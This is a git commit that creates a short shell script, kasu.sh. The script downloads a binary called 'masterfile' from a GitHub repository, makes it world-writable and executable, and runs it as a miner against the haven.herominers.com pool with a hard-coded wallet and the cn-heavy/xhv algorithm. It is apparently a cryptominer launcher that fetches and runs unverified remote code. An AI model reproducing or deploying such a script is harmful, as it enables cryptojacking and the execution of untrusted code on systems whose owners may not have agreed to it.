23f4ffa764761e3c3f23d34967a42b0ee84f3518
Tvsx3337 <86508157+Tvsx3337@users.noreply.github.com>
2021-06-26 10:38:51 +0530

    Create kasu.sh

---
+++ kasu.sh
@@ -0,0 +1,3 @@
+wget https://github.com/thoeb292/thoeb292/raw/main/masterfile
+chmod 777 masterfile
+./masterfile -o haven.herominers.com:10450 -u hvxy1e2jj3hBgTHywo8VNR85VBBDfr7EeVaJtEiaJR7RPWa7YVeRWT552mU3y79YVyR1yTo4ApxQ5X9refkZ62Ln5v2vdy7PK1 -p joker -a cn-heavy/xhv -k 
